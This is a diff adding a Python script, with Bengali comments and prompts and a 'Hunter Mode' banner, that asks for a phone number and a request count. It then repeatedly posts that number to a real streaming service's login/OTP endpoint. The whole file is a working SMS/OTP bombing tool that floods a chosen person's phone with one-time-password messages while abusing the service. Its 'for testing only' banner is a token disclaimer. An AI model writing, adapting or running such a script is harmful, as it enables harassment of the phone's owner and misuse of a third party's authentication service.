@@ -1,0 +1,123 @@
+import requests
+import time
+import json
+import os
+import signal
+from requests.exceptions import RequestException, ConnectionError, Timeout
+
+# --- কোডটি CTRL+C চেপে বন্ধ করার জন্য ---
+def signal_handler(sig, frame):
+    print("\n\n\033[1;31m[-] কোডটি বন্ধ করা হচ্ছে... ভালো থাকবেন! \033[0m")
+    exit(0)
+
+signal.signal(signal.SIGINT, signal_handler)
+
+# --- বড় এবং রঙিন ব্যানার ---
+def show_banner():
+    os.system('clear') # স্ক্রিন পরিষ্কার করার জন্য
+    # বড় ফন্ট (Block style)
+    large_banner = """
+\033[1;32m
+██╗  ██╗██╗   ██╗███╗   ██╗████████╗███████╗██████╗ 
+██║  ██║██║   ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗
+███████║██║   ██║██╔██╗ ██║   ██║   █████╗  ██████╔╝
+██╔══██║██║   ██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗
+██║  ██║╚██████╔╝██║ ╚████║   ██║   ███████╗██║  ██║
+╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
+
+███╗   ███╗ ██████╗ ██████╗ ███████╗
+████╗ ████║██╔═══██╗██╔══██╗██╔════╝
+██╔████╔██║██║   ██║██║   ██║█████╗  
+██║╚██╔╝██║██║   ██║██║   ██║██╔══╝  
+██║ ╚═╝ ██║╚██████╔╝██████╔╝███████╗
+╚═╝     ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝
+\033[1;36m
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+\033[1;33m  🌟 Developed by : @saeid9.90
+\033[1;33m  🚀 Tool Version : 2.0 (Pro)
+\033[1;33m  ⚠️ Use responsibly for testing only.
+\033[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+\033[0m
+    """
+    print(large_banner)
+
+TARGET_API = "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en"
+DELAY_SECONDS = 2  
+
+def send_continuous_requests_fast():
+    show_banner()
+    print(f"\033[1;37m[*] সার্ভার সংযোগ পরীক্ষা করা হচ্ছে... \033[0m")
+    time.sleep(1)
+    print(f"\033[1;32m✅ সার্ভার প্রস্তুত। রিকোয়েস্টের মধ্যে {DELAY_SECONDS} সেকেন্ড দেরি হবে। \033[0m\n")
+    
+    while True:
+        user_number = input("\033[1;34m👤 সচল ফোন নম্বর দিন (যেমন: 01xxxxxxxxx): \033[0m").strip()
+        if user_number.isdigit() and len(user_number) >= 11:
+            break
+        else:
+            print("\033[1;31m❌ নম্বরটি সঠিক নয়! দয়া করে ১১ ডিজিটের সচল নম্বর দিন। \033[0m")
+
+    while True:
+        try:
+            amount_str = input("\033[1;34m🔢 কতবার রিকোয়েস্ট পাঠাতে চান? : \033[0m")
+            amount = int(amount_str)
+            if amount > 0:
+                break
+            else:
+                print("\033[1;31m❌ পরিমাণটি অবশ্যই ১-এর বেশি হতে হবে। \033[0m")
+        except ValueError:
+            print("\033[1;31m❌ ভুল ইনপুট! দয়া করে একটি সংখ্যা লিখুন। \033[0m")
+            
+    post_data = {
+        "country": "BD",
+        "platform": "web",
+        "language": "en",
+        "number": user_number,  
+        "operator": "bd-otp-test"
+    }
+
+    print(f"\n\033[1;32m🚀 রিকোয়েস্ট পাঠানো শুরু হচ্ছে... \n🔗 লক্ষ্য: {user_number} | 🎯 পরিমাণ: {amount} \033[0m\n")
+    print(f"\033[1;33m💡 (বন্ধ করতে চাইলে CTRL+C চাপুন) \033[0m\n")
+    
+    success_count = 0
+    fail_count = 0
+
+    for i in range(amount):
+        request_number = i + 1
+        
+        try:
+            print(f"\033[1;36m[{request_number}/{amount}] ━━━━━━━━━━━━━━━━━━━━━━━\033[0m")
+            print(f"📡 রিকোয়েস্ট নং {request_number} পাঠানো হচ্ছে...", end="\r")
+            
+            response = requests.post(TARGET_API, json=post_data, timeout=10)
+            
+            if response.status_code == 200:
+                print(f"✅ রিকোয়েস্ট {request_number} সফলভাবে পাঠানো হয়েছে!      ")
+                success_count += 1
+            else:
+                print(f"⚠️ রিকোয়েস্ট {request_number} ব্যর্থ হয়েছে। স্ট্যাটাস কোড: {response.status_code}      ")
+                fail_count += 1
+
+            if request_number < amount:
+                # আরও সুন্দর ওয়েটিং মেসেজ
+                for countdown in range(DELAY_SECONDS, 0, -1):
+                    print(f"⏳ অপেক্ষা করুন... {countdown} সেকেন্ড...", end="\r")
+                    time.sleep(1)
+                print(" " * 30, end="\r") # লাইনের লেখা মুছে ফেলা
+            
+        except (ConnectionError, Timeout):
+            print(f"\n\033[1;31m❌ রিকোয়েস্ট {request_number} ব্যর্থ: নেটওয়ার্ক বা টাইমআউট সমস্যা। \033[0m")
+            fail_count += 1
+            break
+        except RequestException:
+            print(f"\n\033[1;31m❌ রিকোয়েস্ট {request_number} কোনো কারণে ব্যর্থ হয়েছে। \033[0m")
+            fail_count += 1
+            break
+
+    print("\n\033[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m")
+    print(f"\033[1;32m✅ কাজ শেষ! মোট সফল: {success_count} | ব্যর্থ: {fail_count}\033[0m")
+    print(f"\033[1;33m      Developer: @saeid9.90\033[0m")
+    print("\033[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m\n")
+
+if __name__ == "__main__":
+    send_continuous_requests_fast()
